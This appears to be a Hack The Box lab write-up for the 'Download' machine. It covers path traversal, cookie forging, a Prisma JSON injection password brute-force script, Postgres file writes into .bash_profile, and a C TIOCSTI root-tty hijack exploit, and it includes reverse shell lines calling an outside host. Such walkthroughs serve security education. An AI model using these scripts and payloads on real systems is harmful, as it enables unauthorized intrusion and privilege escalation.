---
title: "HTB Download"
draft: false
description: "Download is a hard Linux box that hosts an Express app with a file read vulnerability. This allowed me to retrieve the source code, exposing broken authentication and a JSON injection flaw. With these, I brute-forced a user's password, reused for SSH. Found database credentials, got write privileges as postgres, and exploited a cron job. Finally, hijacked root TTY sessions for executing commands as the root user."
categories: ["HTB", "Linux"]
tags:
    - htb-hard
    - express
    - file-read
    - prisma
    - bola
    - json-injection
    - password-bruteforce
    - postgres
    - pg_write_server_files
    - tty
    - root-tty-hijack
date: 2023-11-27T15:13:42+05:30
summary: "Download is a hard linux box on HTB which hosts an Express application with a file read vulnerability that allowed me to retrieve it's source code. Analyzing the code unveiled issues like broken object-level authentication and a JSON injection vulnerability. Leveraging these weaknesses, I successfully brute forced a user's password, which was reused for SSH login. Next, I found database credentials in a URI of a background process. The database granted me `pg_write_server_files` privileges, enabling me to write files on the system as the user postgres. Exploiting a cron job that interactively logs in as postgres, I utilized the write privileges to execute commands in the context of postgres. Further enumeration revealed multiple root TTY sessions, providing an opportunity to hijack them and execute commands as the root user."
---

# Download HTB

## Overview

---

> Download is a hard linux box on HTB which hosts an Express application with a file read vulnerability that allowed me to retrieve it's source code. Analyzing the code unveiled issues like broken object-level authentication and a JSON injection vulnerability. Leveraging these weaknesses, I successfully brute forced a user's password, which was reused for SSH login. Next, I found database credentials in a URI of a background process. The database granted me `pg_write_server_files` privileges, enabling me to write files on the system as the user "postgres". Exploiting a cron job that interactively logs in as "postgres", I utilized the write privileges to execute commands in the context of "postgres". Further enumeration revealed multiple root TTY sessions, providing an opportunity to hijack them and execute commands as the root user.

---

## Enumeration

---

### Open Ports

A nmap scan reveal two open ports

-   port 22 → OpenSSH
-   port 80 → Nginx web server

```bash
> nmap -p- -Pn -T4 --min-rate 1000 --max-retries 5 -oA nmap/10.10.11.226_fullScan 10.10.11.226
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:37 IST
Nmap scan report for download.htb (10.10.11.226)
Host is up (1.2s latency).
Not shown: 64788 filtered tcp ports (no-response), 745 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

> nmap -p22,80 -sV -sC -T4 -Pn -oA nmap/10.10.11.226 10.10.11.226
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 17:49 IST
Nmap scan report for download.htb (10.10.11.226)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)
|   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)
|_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Download.htb - Share Files With Ease
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### port 80 - HTTP

From analyzing the headers, the IP address redirects to the `download.htb` domain. Subsequently, the headers for the domain show that its using Express along with a session cookie and a corresponding signature.

```bash
> http -ph 10.10.11.226
HTTP/1.1 301 Moved Permanently
Connection: keep-alive
Content-Length: 178
Content-Type: text/html
Date: Thu, 10 Aug 2023 12:21:24 GMT
Location: http://download.htb
Server: nginx/1.18.0 (Ubuntu)

> http -ph download.htb
HTTP/1.1 200 OK
...snip...
Server: nginx/1.18.0 (Ubuntu)
Set-Cookie: download_session=...snip...
Set-Cookie: download_session.sig=...snip...
Transfer-Encoding: chunked
X-Powered-By: Express

```

The index page provides general information about the site's services and includes two hyperlinks leading to the upload and login pages.

![index-page](./images/index-page.png "Index page")

<!-- ![register-page](./images/register-page.png) -->

As the name implies, the upload page allows file uploads, but access to other functions requires authentication. Fortunately, the login page conveniently provides a link to the register page. Validating a valid user is also challenging because the error message for incorrect credentials is generic

![upload-page](./images/upload-page.png)

![invalid-creds-error-message](./images/invalid-creds-error-message.png)

---

## Initial Foothold

---

When logging in with the newly created user, a base64-encoded `download_session` cookie and its corresponding cookie signature are set. This cookie also contains a JSON object representing the user.

![login-request-response](./images/login-request-response.png "Login Request")

```bash
> echo 'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiYWJyYXhhcyJ9fQ==' | base64 -d | jq
{
  "flashes": {
    "info": [],
    "error": [],
    "success": [
      "You are now logged in."
    ]
  },
  "user": {
    "id": 16,
    "username": "abraxas"
  }
}
```

To test the file upload function. uploaded a white pixel image at the `/files/upload` upload:

-   Returns a URL to view the image at `/files/view/<d57d0db2-5d52-4f49-8edb-7073c47114a8>`.
-   The copy button, pops up an alert box and the link to this page is copied to the clipboard -> Corresponds to the copy.js is, nothing to exploit here.
-   Download sends a GET req to `/files/download/<d57d0db2-5d52-4f49-8edb-7073c47114a8>`.
-   Delete deletes the image from the server.

To test the file upload function, I uploaded a white pixel image at `/files/upload`. The result was a URL to view the image at `/files/view/<d57d0db2-5d52-4f49-8edb-7073c47114a8>`. The copy button triggered an alert box and copied the link to this page to the clipboard—seems like nothing exploitable in the copy.js. Clicking the Download button sent a GET request to `/files/download/<d57d0db2-5d52-4f49-8edb-7073c47114a8>`. Lastly, the Delete button simply removes the image from the server.

```bash
❯ convert -size 32x32 xc:white empty.png
```

![post-upload-image](./images/post-upload-image.png "Download page")

### File Read

Looking at the download request, it seems that the endpoint sends what appears to be the file UUID as a parameter, this could be potentially be vulnerable to some kind of file read.

![download-endpoint](./images/download-endpoint.png "Download request")

I experimented with various payloads to exploit the potential file read vulnerability, and the only one that worked is `%2e%2e%2f` (URL encoded `../`). Unfortunately, I couldn't read anything beyond the webapp's root directory using this approach. Given that this is an Express application, the `package.json` file could give details about the application, including its dependencies and starting point.

{{< highlight bash "hl_lines=3 6-7 28 32" >}}
> http -pb http://download.htb/files/download/%2e%2e%2fpackage.json
{
    "author": "wesley",
    "dependencies": {
        "@prisma/client": "^4.13.0",
        "cookie-parser": "^1.4.6",
        "cookie-session": "^2.0.0",
        "express": "^4.18.2",
        "express-fileupload": "^1.4.0",
        "zod": "^3.21.4"
    },
    "description": "",
    "devDependencies": {
        "@types/cookie-parser": "^1.4.3",
        "@types/cookie-session": "^2.0.44",
        "@types/express": "^4.17.17",
        "@types/express-fileupload": "^1.4.1",
        "@types/node": "^18.15.12",
        "@types/nunjucks": "^3.2.2",
        "nodemon": "^2.0.22",
        "nunjucks": "^3.2.4",
        "prisma": "^4.13.0",
        "ts-node": "^10.9.1",
        "typescript": "^5.0.4"
    },
    "keywords": [],
    "license": "ISC",
    "main": "app.js",
    "name": "download.htb",
    "scripts": {
        "build": "tsc",
        "dev": "nodemon --exec ts-node --files ./src/app.ts",
        "test": "echo \"Error: no test specified\" && exit 1"
    },
    "version": "1.0.0"
}
{{< /highlight >}}

According to the `package.json` file:

-   The author is `wesley` (possible username).
-   The application is built with TypeScript and uses Zod for schema validation.
-   The entry point specified in the dev script is `app.ts`, likely indicating the presence of an `app.js` file in the root directory.
-   Potentially interesting dependencies
    -   `@prisma/client`
    -   `cookie-parser`
    -   `cookie-session`
    -   `express-fileupload`

#### App.js

Trying to access `app.ts` directly with `/download/%2e%2e%2fsrc%2fapp.ts` leads to a 404 Not Found error. However, accessing `app.js` reveals its source code.

{{< highlight javascript "linenos=table,hl_lines=25-29 13-15 37-39 47" >}}
> http -pb http://download.htb/files/download/%2e%2e%2fapp.js
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
    autoescape: true,
    express: app,
    noCache: true,
});
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
app.get("/", (req, res) => {
    res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
    res.render("error.njk", { statusCode: 404 });
});
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
    console.log("Listening on ", port);
    if (process.env.NODE_ENV === "production") {
        setTimeout(async () => {
            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
        }, 300000);
    }
});

{{< /highlight >}}

-   Line 16 creates an instance for the Prisma client, which is an ORM library for JavaScript.
-   The hardcoded key for session cookies, `8929874489719802418902487651347865819634518936754` could be exploited for forging session cookies.
-   There are also three routes referenced
    -   `./routers/auth`
    -   `./routers/files`
    -   `./routers/home`

*   In a production environment, the app executes a raw SQL query using Prisma. Specifically, joining the `User` and `File` tables based on the author relationship, calculating total file sizes for each user, grouping the results by username, and exporting this data to a CSV file in `/var/backups/`. The raw SQL queries is intriguing .

```sql
COPY (
    SELECT "User".username, sum("File".size)
    FROM "User"
    INNER JOIN "File" ON "File"."authorId" = "User"."id"
    GROUP BY "User".username
) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);
```

As expected, the hardcoded [key](https://github.com/expressjs/cookie-session) is used to [sign the cookies](https://github.com/expressjs/cookie-parser). With the knowledge from the source code, including the session cookie name (`download_session`) and the "secret," I can [create a crafted cookie](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express) using [Cookie-Monster](https://github.com/DigitalInterruption/cookie-monster).

> The middleware will parse the `Cookie` header on the request and expose the cookie data as the property `req.cookies` and, if a `secret` was provided, as the property `req.signedCookies`. These properties are name value pairs of the cookie name to cookie value.

#### Download route

_routers/files.js_

{{< highlight javascript "hl_lines=2-3" >}}

router.get("/download/:fileId", async (req, res) => {
    const fileEntry = await client.file.findFirst({
        where: { id: req.params.fileId },
        select: {
            name: true,
            private: true,
            authorId: true,
        },
    });
    if (fileEntry?.private && req.session?.user?.id !== fileEntry.authorId) {
        return res.status(404);
    }
    return res.download(
        path_1.default.join(uploadPath, req.params.fileId),
        fileEntry?.name ?? "Unknown"
    );
});
{{< /highlight >}}

The download endpoint in this route uses the `findFirst()` prism function to get file entries from the database. If there's no entry for the given file the name property is set to unknown. Then it queries the database for the `fileEntry` and retrieves three properties, `name`, `private` and `authorID` from the database. If the private property is true or the user id doesn't match the `authorId` its will return a 404. This explains why I couldn't read files with file traversal.

The download endpoint in this route uses the `findFirst()` function from Prisma to fetch file entries from the database. If there's no record for the given file, the name property is set to "unknown". Subsequently, it queries the database for the `fileEntry` and retrieves three properties: `name`, `private`, and `authorID`. If the `private` property is true or the user ID doesn't match the `authorId`, it returns a 404. This explains why file traversal didn't work for reading files beyond the root directory.

#### Home route

_routers/home.js_

{{< highlight javascript "hl_lines=2 3" >}}
router.get("/", auth_1.default, async (req, res) => {
    const files = await client.file.findMany({
        where: { author: req.session.user },
        select: {
            id: true,
            uploadedAt: true,
            size: true,
            name: true,
            private: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
{{< /highlight >}}

In this route, multiple files for a user are fetched using Prisma's `findMany()` function. The conditional is that the author parameter matches the user object from the session. This implies that I can view different users' home pages as long as I have a valid user object in the session.

#### Auth route

_routers/auth.js_

{{< highlight javascript "hl_lines=4 9-10 18" >}}

> http -pb http://download.htb/files/download/%2e%2e%2frouters%2fauth.js
...snip...
const hashPassword = (password) => {
    return node_crypto_1.default.createHash("md5").update(password).digest("hex");
};
...snip...
...snip...
router.post("/login", async (req, res) => {
    const user = await client.user.findFirst({
        where: { username: data.username, password: hashPassword(data.password) },
    });
    if (!user) {
        res.flash("error", "That username / password combination did not exist.");
        return res.redirect("/auth/register");
    }
    req.session.user = {
        id: user.id,
        username: user.username,
    };
    res.flash("success", "You are now logged in.");
...snip...
{{< /highlight >}}

Based on the source code for the authentication route, passwords are stored as MD5 hex digests, and the user object used for validation follows a similar pattern as in the previous route, dependent on Prisma's [findFirst()](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#findfirst) function.

### Login bypass

From the login request, I know that the cookie set after logging in contains a user object with `id` and `username` parameters among other things. Furthermore, since the home route appears to rely solely on this user object, manipulating that could potentially give to the home page of authenticated users.

```json
"user":
{
	"id": 16,
	"username": "abraxas"
}
```

Since I didn't have usernames, I tried iterating through IDs. Testing for `id=1` with the user object as `{"user": {"id":1}}` and signing it using Cookie Monster, I gained access to WESLEY's home page → BOLA.

```bash
> echo '{"user": {"id":1}}' > user.json
> ~/Tools/cookie-monster/bin/cookie-monster.js -e -f user.json -k 8929874489719802418902487651347865819634518936754 -n download_session
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /

[+] Data Cookie: download_session=eyJ1c2VyIjp7ImlkIjoxfX0=
[+] Signature Cookie: download_session.sig=CIdiz217BVhPMCi2PN8zK0mYK0k
```

With the crafted cookie, I can access `WESLEY`'s homepage, who has two uploaded files. Unfortunately, neither file yielded valuable information, only revealing the associated username.

![wesley-home-page](./images/wesley-home-page.png "Wesley's home page")

### JSON Injection

Returning to the authentication route, the `findFirst()` function could be vulnerable. As the name implies, it retrieves the first record matching specified conditions. If I can inject my own user object, it has the potential to bypass validation checks. Additionally, Prisma client offers various [filtering options](https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting#filter-conditions-and-operators) such as [contains()](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#contains) and [startsWith()](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#startswith), making `findFirst` vulnerable to JSON Injection.

The username obtained through the Broken Object Level Authentication, coupled with a Prisma filter like `startsWith()` and a regex, I could potentially extract the password based on the response received after validation.

```json
{
    "user": {
        "username": {"contains": "WESLEY"},
        "password": {"startsWith": <some char>},
    }
}
```

Again a valid cookie and its signature can be generated using cookie monster, so to make the process easier I wrote a python script to automate the various steps. Since this would returns MD5 hex digest of the passwords, so the character set would be `[a-f0-9]`.

To streamline the process, I created a Python script that automates the generation of a valid cookie and its signature using Cookie Monster. Since the resulting passwords are in MD5 hex digest format, the character set is limited to `[a-f0-9]`

Running this in a loop for all characters in the charset, and based on the variations in the response length I know two things

-   The first character is `f`
-   The response length for a valid request is `3868`

By iterating through all characters in the character set in a loop, I observed variations in response lengths. The response length for a valid request is `3868`, while an invalid login produces a response length of `2175`. Since the only character that returns a response length of `3868` is `f`, it mean that it is the first character in the password.

```bash
> python cookie_injection.py
Testing char: a
2175
Testing char: b
2175
Testing char: c
2175
Testing char: d
2175
Testing char: e
2175
Testing char: f
3868
Testing char: 0
2175
Testing char: 1
2175
Testing char: 2
2175
Testing char: 3
2175
Testing char: 4
2175
Testing char: 5
2175
Testing char: 6
2175
Testing char: 7
2175
Testing char: 8
2175
Testing char: 9
2175
```

With this updated information, I modified the script to perform the following:

-   Implement an additional loop over a range of 32, considering that hex strings are consistently 32 bytes.
-   Filter any responses that don't match a response length of 3868

```python
#!/usr/bin/env python

import re
import sys

import requests
import urllib3
import subprocess
import os
import json


username = ""
password = ""
url = "http://download.htb/home/"
proxies = {"http": "http://127.0.0.1:8080"}

charset_hex = "abcdef0123456789"
# charset_hex = "a"

params = {"name": "value"}
data = {"name": "value"}
try:
    # Hex is always 128 bits
    for i in range(32):
        for char in charset_hex:
            # print(f"Testing char: {char}")
            temp_pass = password + char
            user_obj = {
                "user": {
                    "username": {"contains": "WESLEY"},
                    "password": {"startsWith": temp_pass},
                }
            }

            with open("user_obj.json", "w") as f:
                f.write(json.dumps(user_obj))

            cmd = [
                "/home/kali/Tools/cookie-monster/bin/cookie-monster.js",
                "-e",
                "-f",
                "user_obj.json",
                "-k",
                "8929874489719802418902487651347865819634518936754",
                "-n",
                "download_session",
            ]
            cookieMonster_out = subprocess.check_output(cmd, text=True)
            # print(cookieMonster_out)
            data_cookie_pattern = r"Data Cookie: download_session=([^[\]+]+)"
            signature_cookie_pattern = (
                r"Signature Cookie: download_session\.sig=([^[\]+]+)"
            )

            data_cookie_match = re.search(data_cookie_pattern, cookieMonster_out)
            signature_cookie_match = re.search(
                signature_cookie_pattern, cookieMonster_out
            )
            if data_cookie_match and signature_cookie_match:
                session_cookie = data_cookie_match.group(1).strip()
                session_sig = signature_cookie_match.group(1).strip()

            # TODO: Why does this happen?
            # Remove the trailing \x1b
            session_cookie = "".join([c for c in session_cookie if c.isprintable()])
            session_sig = "".join([c for c in session_sig if c.isprintable()])

            cookies = {
                "download_session": session_cookie,
                "download_session.sig": session_sig,
            }
            # print(cookies)

            response = requests.get(
                url=url, cookies=cookies, proxies=proxies, verify=False
            )
            response_length = response.headers["Content-Length"]

            if response_length != "2175":
                print(f"Partial: {temp_pass}")
                password += char
                break

    print(f"Final password: {password}")


except Exception as e:
    print(f"Exception raised: {e}")
```

When the script complete its 32 iterations, I get the Wesley's MD5 password hash.

```bash
> python cookie_injection.py
Partial: f
Partial: f8
Partial: f88
Partial: f889
Partial: f8897
Partial: f88976
Partial: f88976c
Partial: f88976c1
Partial: f88976c10
Partial: f88976c10a
Partial: f88976c10af
Partial: f88976c10af6
Partial: f88976c10af66
Partial: f88976c10af669
Partial: f88976c10af6691
Partial: f88976c10af66915
Partial: f88976c10af669159
Partial: f88976c10af6691591
Partial: f88976c10af66915918
Partial: f88976c10af669159189
Partial: f88976c10af6691591894
Partial: f88976c10af66915918945
Partial: f88976c10af66915918945b
Partial: f88976c10af66915918945b9
Partial: f88976c10af66915918945b96
Partial: f88976c10af66915918945b967
Partial: f88976c10af66915918945b9679
Partial: f88976c10af66915918945b9679b
Partial: f88976c10af66915918945b9679b2
Partial: f88976c10af66915918945b9679b2b
Partial: f88976c10af66915918945b9679b2bd
Partial: f88976c10af66915918945b9679b2bd3
Final password: f88976c10af66915918945b9679b2bd3
```

The MD5 hash can be cracked to get the actual password → `dunkindonuts`.

```bash
> sth --no-banner -t 'f88976c10af66915918945b9679b2bd3'

f88976c10af66915918945b9679b2bd3

Text : dunkindonuts
Type : MD5
```

Wesley's login credentials seem to be reused for SSH access.

```bash
> pc wesley:dunkindonuts@download.htb
[03:02:22] Welcome to pwncat 🐈!
[03:02:24] download.htb:22: registered new host w/ db
(local) pwncat$
(remote) wesley@download:/home/wesley$ id
uid=1000(wesley) gid=1000(wesley) groups=1000(wesley)
```

---

## Privilege Escalation to root

---

Unfortunately, `wesley` does not have any sudo privileges on the system.

```bash
(remote) wesley@download:/home/wesley$ sudo -l
[sudo] password for wesley:
Sorry, user wesley may not run sudo on download.
```

The existence of a `.psql_history` file in the home directory indicates that a Postgres database is being used.

```bash
(remote) wesley@download:/home/wesley$ ls -la
total 44
...snip...
lrwxrwxrwx 1 root   root      9 Apr 21 14:33 .psql_history -> /dev/null
drwx------ 2 wesley wesley 4096 Aug 10 19:31 .ssh
-rw-r----- 1 root   wesley   33 Aug 10 19:12 user.txt
-rw-r--r-- 1 wesley wesley   39 Jul 17 11:58 .vimrc
```

The `postgres` user confirms the existence of the database, and is most likely used to manage it.

```bash
(remote) wesley@download:/home/wesley$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
wesley:x:1000:1000:wesley:/home/wesley:/bin/bash
postgres:x:113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

While searching for running `postgres` processes, I discovered one with a URI that includes both the user and password: `download:CoconutPineappleWatermelon`.

```bash
(remote) wesley@download:/home/wesley$ ss -antlp
State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process
LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*
LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*
LISTEN       0            511                    127.0.0.1:3000                   0.0.0.0:*
LISTEN       0            244                    127.0.0.1:5432                   0.0.0.0:*
LISTEN       0            511                      0.0.0.0:80                     0.0.0.0:*
LISTEN       0            128                         [::]:22                        [::]:*


(remote) wesley@download:/home/wesley$ ps aux | grep 5432
wesley      1841  0.0  0.3  24928 13384 pts/3    S+   19:16   0:00 /usr/lib/postgresql/12/bin/psql postgresql://download:CoconutPineappleWatermelon@localhost:5432/download
```

The presence of the URI in a running was peculiar, so used `pspy` to investigate further. Its seems there's a cron job to login _interactively_ as `postgres`.

```bash
2023/08/10 22:08:10 CMD: UID=0     PID=2475   | su -l postgres
```

### RCE as postgres

Successfully logged into the `download` Postgres database using `psql`.

```bash
(remote) wesley@download:/home/wesley$ psql -h localhost -U download -W download
Password:
psql (12.15 (Ubuntu 12.15-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

download=>
```

The user possesses `pg_write_server_files` privileges, allowing me to [write to files as the user running Postgres](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#simple-file-writing) through Postgres queries.

```bash
download=> Select user;
   user
----------
 download
(1 row)

download=> \du
                                          List of roles
 Role name |                         Attributes                         |        Member of
-----------+------------------------------------------------------------+-------------------------
 download  |                                                            | {pg_write_server_files}
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}

download=>
```

For interactive logins, the `.bash_profile`, `.profile`, and `.bashrc` files are executed to configure the environment. Since root logs in interactively as the postgres user, these files will execute within the postgres user's context. Therefore, I can execute commands as the postgres user, using the database attributes. Any commands added to these files will be executed when root logs in interactively.

```bash
download=> copy (select 'I am postgres' ) to '/tmp/postgres_exec_test';
COPY 1
download=> exit
(remote) wesley@download:/home/wesley$ cat /tmp/postgres_exec_test
I am postgres
```

Similarly, I can add a reverse shell payload to get a shell as the `postgres` user.

```bash
download=> copy (select '/bin/sh -i >& /dev/tcp/10.10.14.42/9005 0>&1' ) to '/var/lib/postgresql/.bash_profile';
COPY 1
```

I successfully got a shell as the `postgres` user. However, it appears that even an upgraded shell terminates quickly, likely due to the interactive login ending.

```bash
(remote) postgres@download:/var/lib/postgresql$ bash: [1993: 2 (255)] tcsetattr: Input/output error
                                                                                                   Hangup
```

To get a stable shell, I injected SSH keys into postgres' ssh directory. That said, I found nothing to escalate.

```bash
(remote) postgres@download:/var/lib/postgresql$ id
uid=113(postgres) gid=118(postgres) groups=118(postgres),117(ssl-cert)
(remote) postgres@download:/var/lib/postgresql$ find / -group ssl-cert 2>/dev/null
/etc/ssl/private
(remote) postgres@download:/var/lib/postgresql$ ls -la /etc/ssl/private
ls: cannot open directory '/etc/ssl/private': Permission denied
(remote) postgres@download:/var/lib/postgresql$ ls -ld /etc/ssl/private
drwx--x--- 2 root ssl-cert 4096 Jul 19 15:35 /etc/ssl/private
```

### Root TTY exploit

The last logons section from `linpeas.sh` is intriguing. It show root pty sessions from localhost, which is unusual.

```bash
╔══════════╣ Last logons
reboot   system boot  Tue Aug  1 11:25:10 2023 - Tue Aug  1 11:32:33 2023  (00:07)     0.0.0.0
root     pts/1        Tue Aug  1 11:24:41 2023 - down                      (00:00)     127.0.0.1
wesley   pts/0        Tue Aug  1 11:23:56 2023 - Tue Aug  1 11:24:58 2023  (00:01)     10.10.14.46
wesley   pts/0        Tue Aug  1 11:23:38 2023 - Tue Aug  1 11:23:52 2023  (00:00)     10.10.14.46
root     pts/1        Tue Aug  1 11:23:05 2023 - Tue Aug  1 11:23:40 2023  (00:00)     127.0.0.1
root     pts/1        Tue Aug  1 11:21:29 2023 - Tue Aug  1 11:22:04 2023  (00:00)     127.0.0.1
wesley   pts/0        Tue Aug  1 11:20:41 2023 - Tue Aug  1 11:23:31 2023  (00:02)     10.10.14.46
reboot   system boot  Tue Aug  1 11:20:09 2023 - Tue Aug  1 11:25:00 2023  (00:04)     0.0.0.0

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             pts/10   127.0.0.1        Fri Aug 11 15:29:15 +0000 2023
wesley           pts/13   10.10.14.106     Fri Aug 11 15:33:26 +0000 2023
```

The `w` command provides a snapshot of currently logged-in users and the processes they are running. Specifically, it shows the tty session by root is being used to interact with the postgres database.

```bash
(remote) postgres@download:/tmp$ w
 15:21:47 up 19 min,  6 users,  load average: 0.23, 0.25, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
wesley   pts/0    10.10.14.132     15:03   14:28   0.08s  0.08s -bash
root     pts/8    127.0.0.1        15:21   27.00s  0.09s  0.05s /usr/lib/postgresql/12/bin/psql
```

While exploring potential exploits for root tty sessions, I stumbled upon an interesting [blog post](https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking) about hijacking root tty sessions. The PoC for this exploit requires an interactive shell, which is fulfilled by the interactive root login.

_PoC from the blog post_

```bash
# su -s /bin/sh - nobody
No directory, logging in with HOME=/
$ /tmp/exploit
exit
echo Payload as $(whoami)
$ # echo Payload as $(whoami)
Payload as root
```

I modified the PoC code to execute a reverse shell payload.

_exploit.c_

```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>

int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\nbash -i >& /dev/tcp/10.10.14.132/9005 0>&1\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

Executing this on the box, returns a `version "GLIBC_2.32" not found` error, meaning it lacks GCC and necessary shared library objects, it needs to be compiled statically using the `--static` flag.

```bash
> gcc exploit.c -o exploit.out --static
> file exploit.out
exploit.out: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=c5897a5e18cb4e66dfd9bda71dbb57a78260ae73, for GNU/Linux 3.2.0, not stripped
```

Uploaded the statically compiled binary and made it executable.

```bash
(remote) wesley@download:/home/wesley$ chmod +x /tmp/abraxas/exploit.out
(remote) wesley@download:/home/wesley$ ls -la /tmp/abraxas/exploit.out
-rwxrwxr-x 1 wesley wesley 751728 Aug 11 18:33 /tmp/abraxas/exploit.out
```

I leveraged the the postgres attributes to execute the static binary in the interactive session.

```bash
download=> COPY (SELECT '/tmp/exploit.out') TO '/var/lib/postgresql/.bash_profile';
COPY 1
```

When the cron job executes, I get a shell back as root.

```bash
> pc -lp 9005
[23:38:24] Welcome to pwncat 🐈!                                 __main__.py:164
[23:38:53] received connection from 10.10.11.226:35256                bind.py:84
[23:38:54] 10.10.11.226:35256: registered new host w/ db          manager.py:957
(local) pwncat$
(remote) root@download:/root# ls -al root.txt
total 52
drwx------  7 root root 4096 Jul 19 16:07 .
drwxr-xr-x 19 root root 4096 Jul 19 16:06 ..
lrwxrwxrwx  1 root root    9 Apr 21 14:33 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  5 root root 4096 Jul 19 15:35 .cache
drwxr-xr-x  3 root root 4096 Jul 19 15:35 .local
-rwxr-xr-x  1 root root  259 Apr 21 17:04 manage-db
-rw-r--r--  1 root root  770 Apr 21 17:05 management.py
drwxr-xr-x  5 root root 4096 Jul 19 15:35 .npm
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Aug 11 17:32 root.txt
drwx------  2 root root 4096 Jul 19 15:35 .ssh
drwxr-xr-x  6 root root 4096 Jul 19 15:35 venv
-rw-r--r--  1 root root   39 Jul 17 11:59 .vimrc
(remote) root@download:/root#

```

**Pwned!!**

![Pwned](./images/Pwned.png)

## Beyond root

Root's home directory has two files, `management.py` and `manage-db`, `pspy` confirms these two files are being executed recurrently as cron jobs.

```bash
2023/08/11 15:18:13 CMD: UID=0     PID=980    | /root/venv/bin/python3 /root/management.py

2023/08/11 15:21:15 CMD: UID=0     PID=23403  | /bin/bash -i ./manage-db
```

The `manage-db` bash script is responsible for checking the status of the database and the webserver. Additionally, the `download-site` service contains the PostgreSQL URI and references the website's root directory, `/var/www/app`.

```bash
(remote) root@download:/root$ cat manage-db
#!/bin/bash -i

echo "[*] Checking status of database"
SYSTEMD_PAGER= systemctl status postgresql

echo "[*] Checking status of webserver"
SYSTEMD_PAGER= systemctl status download-site

echo "[*] Entering postgres user, use 'psql' to enter DB"
su -l postgres

(remote) root@download:/root$ cat /etc/systemd/system/download-site.service
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"

[Install]
WantedBy=multi-user.target
```

```bash
(remote) root@download:/var/www# ls -la
total 16
drwxr-xr-x  4 root root 4096 Apr 21 16:10 .
